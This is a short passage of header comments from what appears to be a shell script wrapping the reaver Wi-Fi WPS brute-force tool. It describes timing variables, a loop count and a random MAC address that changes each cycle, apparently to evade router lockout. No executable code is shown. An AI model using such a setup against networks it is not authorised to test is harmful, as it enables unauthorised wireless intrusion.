# $LIVE = Sets the time reaver is active. Must be shorter then $TIMDELAY above.
# $COUNT = The scrip uses a loop. Each loop takes approx five minutes and each
#    loop cycle has it's own random mac code. 
# #VARMAC = Random mac which changes each loop cycle.
##################################################################################
